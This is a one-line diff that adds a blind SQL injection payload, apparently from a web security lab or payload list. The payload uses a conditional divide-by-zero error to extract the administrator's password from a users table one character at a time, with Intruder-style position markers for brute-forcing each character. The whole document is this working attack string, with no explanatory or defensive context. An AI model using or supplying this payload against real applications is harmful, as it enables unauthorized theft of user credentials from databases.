@@ -1,0 +1,1 @@
+'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='A_VALUE' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
